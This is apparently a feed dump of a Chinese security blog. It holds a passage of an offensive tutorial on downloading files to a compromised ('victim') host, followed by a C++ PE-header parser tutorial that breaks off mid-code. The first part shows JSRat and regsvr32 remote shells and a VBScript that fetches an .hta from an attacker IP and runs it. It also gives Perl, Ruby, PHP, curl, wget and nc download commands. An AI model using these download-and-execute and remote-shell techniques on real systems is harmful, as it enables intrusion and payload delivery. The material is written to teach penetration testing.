class="line">http:&#x2F;&#x2F;www.hexacorn.com&#x2F;blog&#x2F;2017&#x2F;05&#x2F;01&#x2F;running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline&#x2F;</span><br></pre></td></tr></table></figure><p>使用JSRat来做演示，项目地址：<code>https://github.com/Hood3dRob1n/JSRat-Py</code></p><p>使用命令如下命令来开启服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python JSRat.py -i 192.168.183.138 -p 8023</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/RemoteDownload/12.png?raw=true" alt="image-20200712004212163"></p><p>然后访问<code>http://192.168.183.138:8023/wtf</code>这边有教你怎么用</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/RemoteDownload/13.png?raw=true" alt="image-20200712004339053"></p><p>执行完命令可以看到目标已经连上了</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/RemoteDownload/14.png?raw=true" alt="image-20200712004613488"></p><p>注意：这边<strong>powershell</strong>运行会报错，需要使用<strong>cmd</strong>才行</p><h5 id="regsvr32"><a href="#regsvr32" class="headerlink" title="regsvr32"></a>regsvr32</h5><p>Regsvr32命令用于注册COM组件，是Windows系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行，我们可以通过该命令来实现远程文件下载</p><p>搭建服务方式和上面的一样，然后还是访问那个URL</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/RemoteDownload/15.png?raw=true" alt="image-20200712005441738"></p><p>执行这个命令</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/RemoteDownload/16.png?raw=true" alt="image-20200712005501136"></p><p>可以看到直接连上了</p><h5 id="VisualBasic"><a href="#VisualBasic" class="headerlink" title="VisualBasic"></a>VisualBasic</h5><p>自1998年以来，Visual Basic的最终版本已在Windows计算机上成为标准配置。以下脚本可以下载您选择的文件。但是，该脚本比PowerShell脚本大得多。</p><p>把这段代码写到文本里面然后保存为<strong>vbs</strong>后缀</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span> Post = CreateObject(<span class="string">&quot;Msxml2.XMLHTTP&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> Shell = CreateObject(<span class="string">&quot;Wscript.Shell&quot;</span>)</span><br><span class="line">Post.Open <span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://192.168.183.138:8000/asctobe.hta&quot;</span>,<span class="number">0</span></span><br><span class="line">Post.Send()</span><br><span class="line"><span class="keyword">Set</span> aGet = CreateObject(<span class="string">&quot;ADODB.Stream&quot;</span>)</span><br><span class="line">aGet.Mode = <span class="number">3</span></span><br><span class="line">aGet.Type = <span class="number">1</span></span><br><span class="line">aGet.Open()</span><br><span class="line">aGet.Write(Post.responseBody)</span><br><span class="line">aGet.SaveToFile <span class="string">&quot;F:\ascotbe\ascotbe.hta&quot;</span>,<span class="number">2</span> <span class="comment">&#x27;保存在哪里</span></span><br><span class="line">wscript.sleep <span class="number">1000</span></span><br><span class="line">Shell.Run (<span class="string">&quot;F:\ascotbe\ascotbe.hta&quot;</span>) <span class="comment">&#x27;延迟过后执行下载文件</span></span><br></pre></td></tr></table></figure><p>然后运行命令执行他</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wscript .\test.vbs</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/RemoteDownload/17.png?raw=true" alt="image-20200712124235161"></p><p>还是主要下载<code>exe</code>文件，运行的话比较方便</p><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h4><p>Perl是目前很受欢迎的主流脚本语言，linux主机一般都自带perl环境，我们可以在终端中使用vim来编辑一个perl脚本，之后执行perl来实现远程文件下载</p><p>把下面代码保存为<code>test.pl</code></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!perl</span></span><br><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"><span class="keyword">use</span> LWP::Simple;</span><br><span class="line">getstore(<span class="string">&quot;http://192.168.1.7:8000/ascotbe.hta&quot;</span>,<span class="string">&quot;test.hta&quot;</span>);</span><br></pre></td></tr></table></figure><p>然后运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl test.pl</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/RemoteDownload/18.png?raw=true" alt="image-20200712134650144"></p><h3 id="第三方软件"><a href="#第三方软件" class="headerlink" title="第三方软件"></a>第三方软件</h3><h4 id="Windows-Linux通用"><a href="#Windows-Linux通用" class="headerlink" title="Windows/Linux通用"></a>Windows/Linux通用</h4><h5 id="Wget"><a href="#Wget" class="headerlink" title="Wget"></a>Wget</h5><p>wget 是一个从网络上自动下载文件的自由工具，支持通过 HTTP、HTTPS、FTP 三个最常见的 TCP/IP协议下载，并可以使用HTTP 代理。”wget” 这个名称来源于 “World Wide Web” 与 “get” 的结合。</p><p>直接下载服务器下的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.183.138:8000/test.txt</span><br></pre></td></tr></table></figure><h5 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h5><p>cURL是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行，它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称cURL为下载工具，cURL还包含了用于程序开发的libcurl。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.183.138:8000/test.txt -o evil.exe</span><br></pre></td></tr></table></figure><h5 id="ncat"><a href="#ncat" class="headerlink" title="ncat"></a>ncat</h5><p>nc是一款安全工具，它还有其他的名字 Netcat， Ncat 可用来做端口扫描，端口转发，连接远程系统等。</p><p>服务器运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8023 &lt; ascotbe.exe</span><br></pre></td></tr></table></figure><p>受害机器下载运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  192.168.183.138 8023 &gt; ascotbe.exe</span><br></pre></td></tr></table></figure><h5 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h5><p>Python是目前很受欢迎的主流脚本语言，这个的话直接用<strong>request</strong>请求然后获取数据保存为<code>XXX.txt</code>文件即可</p><h5 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h5><p>当目标主机内安装了Ruby时</p><p>把文件保存为<code>test.rb</code>，使用的是默认80端口</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!ruby</span></span><br><span class="line"><span class="meta">#!/usr/bin/ruby</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;net/http&#x27;</span></span><br><span class="line">Net::HTTP.start(<span class="string">&quot;192.168.183.142&quot;</span>) &#123; <span class="params">|http|</span></span><br><span class="line">r = http.get(<span class="string">&quot;/ascotbe.sh&quot;</span>)</span><br><span class="line">open(<span class="string">&quot;test.sh&quot;</span>, <span class="string">&quot;wb&quot;</span>) &#123; <span class="params">|file|</span></span><br><span class="line">file.write(r.body)&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby test.rb</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/RemoteDownload/19.png?raw=true" alt="image-20200712135455650"></p><h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><p>当目标主机内安装了PHP时</p><p>把下面代码保存为<code>test.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$data</span> = @file(<span class="string">&quot;http://192.168.183.142/ascotbe.sh&quot;</span>);</span><br><span class="line">        <span class="variable">$lf</span> = <span class="string">&quot;test.sh&quot;</span>;</span><br><span class="line">        <span class="variable">$fh</span> = fopen(<span class="variable">$lf</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">        fwrite(<span class="variable">$fh</span>, <span class="variable">$data</span>[<span class="number">0</span>]);</span><br><span class="line">        fclose(<span class="variable">$fh</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php test.php</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/RemoteDownload/20.png?raw=true" alt="image-20200712135856567"></p><h4 id="仅限windows"><a href="#仅限windows" class="headerlink" title="仅限windows"></a>仅限windows</h4><h5 id="Notepad"><a href="#Notepad" class="headerlink" title="Notepad"></a>Notepad</h5><p>如果你有权限接入一台(远程连接或者物理机)电脑，但是当前用户权限不允许打开浏览器，但是目标主机有安装<strong>notepad</strong>那么可以下载保存运行一部到位</p><p>首先点击这个</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/RemoteDownload/21.png?raw=true" alt="image-20200712010411814"></p><p>然后这个位置输入<strong>WEB</strong>连接</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/RemoteDownload/22.png?raw=true" alt="image-20200712010547770"></p><p>可以看到这个</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/RemoteDownload/23.png?raw=true" alt="image-20200712010620333"></p><p>当然windows自带的<code>notepad.exe</code>也是一样可以打开远程文件的，用法也是一样</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/RemoteDownload/24.png?raw=true" alt="image-20200712122006652"></p><p>打开如下</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/RemoteDownload/25.png?raw=true" alt="image-20200712122029596"></p><h4 id="仅限Linux"><a href="#仅限Linux" class="headerlink" title="仅限Linux"></a>仅限Linux</h4><h5 id="Axel"><a href="#Axel" class="headerlink" title="Axel"></a>Axel</h5><p>这是wget的出色替代者，是一款轻量级下载实用工具。它实际上是个加速器，因为它打开了多路http连接，可下载独立文件片段，因而文件下载起来更快速。</p><p><strong>安装</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install axel </span><br></pre></td></tr></table></figure><p>下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">axel http://192.168.1.7:8000/ascotbe.hta</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/RemoteDownload/26.png?raw=true" alt="image-20200712125416896"></p><h5 id="Aria2"><a href="#Aria2" class="headerlink" title="Aria2"></a>Aria2</h5><p>这是一种开源命令行下载加速器，支持多个端口，你可以使用最大带宽来下载文件，是一款易于安装、易于使用的工具。</p><p>安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install aria2 </span><br></pre></td></tr></table></figure><p>下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aria2c http://192.168.1.7:8000/ascotbe.hta</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/RemoteDownload/27.png?raw=true" alt="image-20200712130640141"></p><p>参考文章</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;linux.cn&#x2F;article-7369-1.html</span><br><span class="line">https:&#x2F;&#x2F;blog.netspi.com&#x2F;15-ways-to-download-a-file&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;7937</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>恶意程序研究之PE解析器</title>
    <link href="https://www.ascotbe.com/2020/07/05/PortableExecutableParser/"/>
    <id>https://www.ascotbe.com/2020/07/05/PortableExecutableParser/</id>
    <published>2020-07-05T12:45:53.000Z</published>
    <updated>2021-05-04T06:03:28.063Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>之前为了学习PE结构知识恶补了一下相关文章，然后使用<code>010 Editor</code>这个软件也可以完整的读取出PE的结构和字段，但是这都是别人写好的，自己没有玩过一遍的东西都不叫学过，那只能叫见过所以就有了这篇文章，各位看官别急需要几天时间才能搞定，毕竟还不熟悉如果有哪里写错了，忘各位斧正！（PS：当前代码输出不够美观后期会修改）</p><h4 id="使用环境"><a href="#使用环境" class="headerlink" title="使用环境"></a>使用环境</h4><ul><li>Visual Studio 2019 （宇宙最强编译器</li><li>windows 10</li></ul><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p><a href="https://www.ascotbe.com/2020/03/23/PEStructureCombing/">恶意程序研究之PE结构梳理</a></p><h4 id="获取文件映象"><a href="#获取文件映象" class="headerlink" title="获取文件映象"></a>获取文件映象</h4><p>首先介绍下内存映射文件技术作用</p><ul><li>使用内存映射文件来访问磁盘上的数据文件。这使你可以不必对文件执行<strong>I/O</strong>操作，并且可以不必对文件内容进行缓存.</li><li>可以使用内存映射文件，使同一台计算机上运行的多个进程能够相互之间共享数据。windows确实提供了其他一些方法，以便在进程之间进行数据通信，但是这些方法都是使用内存映射文件来实现的，诸如使用<strong>SendMessage</strong>或者<strong>PostMessage</strong>，都在内部使用了内存映射文件.这使得内存映射文件成为单个计算机上的多个进程互相进行通信的最有效的方法。</li></ul><p>其实我们需要获取文件的内存映射的话需要完成三步</p><ul><li>获取这个文件的句柄（CreateFile）</li><li>获取文件映射对象的句柄（CreateFileMapping）</li><li>在调用进程的地址空间映射一个文件视图（MapViewOfFile）</li></ul><p>具体的代码如下，返回一个映射视图的起始地址，这个地址会贯穿全文</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">OpenPeByFileName</span><span class="params">(LPTSTR FileName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LPTSTR PortableExecutableFileName = FileName;<span class="comment">//获取PE文件名字</span></span><br><span class="line">    HANDLE hFile, hMapFile, hMapAddress = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwFileSize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    hFile = CreateFile(PortableExecutableFileName, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);<span class="comment">//获取程序句柄</span></span><br><span class="line">    dwFileSize = GetFileSize(hFile, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;文件大小：                                       &quot;</span> &lt;&lt; dwFileSize&lt;&lt;<span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    hMapFile = CreateFileMapping(hFile, <span class="literal">NULL</span>, PAGE_READONLY, <span class="number">0</span>, dwFileSize, <span class="literal">NULL</span>);<span class="comment">//创建文件映象</span></span><br><span class="line">    hMapAddress = MapViewOfFile(hMapFile, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, dwFileSize);<span class="comment">//在调用进程的地址空间映射一个文件视图，返回一个映射视图的起始地址</span></span><br><span class="line">                                                                           <span class="comment">//把B进程的文件映象存放到A中，这样好通信</span></span><br><span class="line">    <span class="keyword">if</span> (hMapAddress != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> hMapAddress;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hMapAddress = <span class="literal">NULL</span>;</span><br><span class="line">    lpMapAddress = OpenPeByFileName(<span class="string">L&quot;D:\\BitComet\\BitComet.exe&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="获取PE指纹（DOS头）"><a href="#获取PE指纹（DOS头）" class="headerlink" title="获取PE指纹（DOS头）"></a>获取PE指纹（DOS头）</h4><p>通过把文件映象转换成<strong>PIMAGE_DOS_HEADER</strong>表，然后读取就可以</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisplayDOSHeadInfo</span><span class="params">(HANDLE ImageBase)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PIMAGE_DOS_HEADER pDosHead = <span class="literal">NULL</span>;</span><br><span class="line">    pDosHead = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;DOS签名(MZSignature)：                           %x\n&quot;</span>, pDosHead-&gt;e_magic);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;文件最后页的字节数(UsedBytesInTheLastPage)：     %x\n&quot;</span>, pDosHead-&gt;e_cblp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;文件页数(FileSizeInPages)：                      %x\n&quot;</span>, pDosHead-&gt;e_cp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;重定义元素个数(NumberOfRelocationItems)：        %x\n&quot;</span>, pDosHead-&gt;e_crlc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;头部尺寸(HeaderSizeInParagraphs)：               %x\n&quot;</span>, pDosHead-&gt;e_cparhdr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;所需的最小附加段(MinimumExtraParagraphs)：       %x\n&quot;</span>, pDosHead-&gt;e_minalloc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;所需的最大附加段(MaximumExtraParagraphs)：       %x\n&quot;</span>, pDosHead-&gt;e_maxalloc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;初始的SS值(InitialRelativeSS)：                  %x\n&quot;</span>, pDosHead-&gt;e_ss);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;初始的SP值(InitialSP)：                          %x\n&quot;</span>, pDosHead-&gt;e_sp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;校验和(Checksum)：                               %x\n&quot;</span>, pDosHead-&gt;e_csum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;初始的IP值(InitialIP)：                          %x\n&quot;</span>, pDosHead-&gt;e_ip);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;初始的CS值(InitialRelativeCS)：                  %x\n&quot;</span>, pDosHead-&gt;e_cs);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;重分配表文件地址(AddressOfRelocationTable)：     %x\n&quot;</span>, pDosHead-&gt;e_lfarlc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;覆盖号(OverlayNumber)：                          %x\n&quot;</span>, pDosHead-&gt;e_ovno);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;保留字[4](Reserved)：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved[0]：                                    %x\n&quot;</span>, pDosHead-&gt;e_res[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved[1]：                                    %x\n&quot;</span>, pDosHead-&gt;e_res[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved[2]：                                    %x\n&quot;</span>, pDosHead-&gt;e_res[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved[3]：                                    %x\n&quot;</span>, pDosHead-&gt;e_res[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;OEM标识符(OEMid)：                               %x\n&quot;</span>, pDosHead-&gt;e_oemid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;OEM信息(OEMinfo)：                               %x\n&quot;</span>, pDosHead-&gt;e_oeminfo);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;保留字[10](Reserved2)：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved2[0]：                                   %x\n&quot;</span>, pDosHead-&gt;e_res2[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved2[1]：                                   %x\n&quot;</span>, pDosHead-&gt;e_res2[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved2[2]：                                     %x\n&quot;</span>, pDosHead-&gt;e_res2[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved2[3]：                                   %x\n&quot;</span>, pDosHead-&gt;e_res2[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved2[4]：                                   %x\n&quot;</span>, pDosHead-&gt;e_res2[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved2[5]：                                   %x\n&quot;</span>, pDosHead-&gt;e_res2[<span class="number">5</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved2[6]：                                   %x\n&quot;</span>, pDosHead-&gt;e_res2[<span class="number">6</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved2[7]：                                   %x\n&quot;</span>, pDosHead-&gt;e_res2[<span class="number">7</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved2[8]：                                   %x\n&quot;</span>, pDosHead-&gt;e_res2[<span class="number">8</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reserved2[9]：                                   %x\n&quot;</span>, pDosHead-&gt;e_res2[<span class="number">9</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;指示NT头的偏移(AddressOfNewExeHeader)：          %x\n&quot;</span>, pDosHead-&gt;e_lfanew);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到我们在使用<code>010 Editor</code>和<code>VS 2019</code>中读取的内容一致</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/PE/20.png?raw=true" alt="image-20200705192958733"></p><p>输出内容</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/PE/21.png?raw=true" alt="image-20200705193058120"></p><h4 id="获取NT头"><a href="#获取NT头" class="headerlink" title="获取NT头"></a>获取NT头</h4><p>获取NT表的句柄，因为后面都需要用到，所以这边直接封装成函数就好</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PIMAGE_NT_HEADERS <span class="title">GetNtHead</span><span class="params">(HANDLE ImageBase)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PIMAGE_DOS_HEADER pDosHead = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS pNtHead = <span class="literal">NULL</span>;</span><br><span class="line">    pDosHead = (PIMAGE_DOS_HEADER)ImageBase;</span><br><span class="line">    pNtHead = (PIMAGE_NT_HEADERS)((DWORD)pDosHead + pDosHead-&gt;e_lfanew);</span><br><span class="line">    <span class="keyword">return</span> pNtHead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Signatur"><a href="#Signatur" class="headerlink" title="Signatur"></a>Signatur</h5><p>这个参数和<strong>IMAGE_FILE_HEADER</strong>表一起获取即可</p><h5 id="IMAGE-FILE-HEADER"><a href="#IMAGE-FILE-HEADER" class="headerlink" title="IMAGE_FILE_HEADER"></a>IMAGE_FILE_HEADER</h5><p>这个表示在NT表下面所以直接调用就好</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DisplayFileHeaderInfo</span><span class="params">(HANDLE ImageBase)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PIMAGE_NT_HEADERS pNtHead = <span class="literal">NULL</span>;</span><br><span class="line">    pNtHead = GetNtHead(ImageBase);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;签名(Signatur):                                  %x\n&quot;</span>, pNtHead-&gt;Signature);<span class="comment">//这个是Signatur值</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;运行平台(Machine):                               %x\n&quot;</span>, pNtHead-&gt;FileHeader.Machine);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;节区数目(NumberOfSections):                      %x\n&quot;</span>, pNtHead-&gt;FileHeader.NumberOfSections);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;创建时间(TimeDateStamp):                         %x\n&quot;</span>, pNtHead-&gt;FileHeader.TimeDateStamp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;COFF文件符号表偏移(PointerToSymbolTable):        %x\n&quot;</span>, pNtHead-&gt;FileHeader.PointerToSymbolTable);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;符号表的数量(NumberOfSymbols):                   %x\n&quot;</span>, pNtHead-&gt;FileHeader.NumberOfSymbols);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;可选头大小(SizeOfOptionalHeader):                %x\n&quot;</span>, pNtHead-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;文件特性(Characteristics):                       %x\n&quot;</span>, pNtHead-&gt;FileHeader.Characteristics);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到输出内容完全一致</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/PE/22.png?raw=true" alt="image-20200705194630967"></p><p>输出内容</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/PE/23.png?raw=true" alt="image-20200705194438923"></p><h5 id="IMAGE-OPTIONAL-HEADER"><a href="#IMAGE-OPTIONAL-HEADER" class="headerlink" title="IMAGE_OPTIONAL_HEADER"></a>IMAGE_OPTIONAL_HEADER</h5><p>直接贴代码，因为该表中<strong>IMAGE_DATA_DIRECTORY</strong>表没啥用这边就展示不写了，后面有时间补上</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 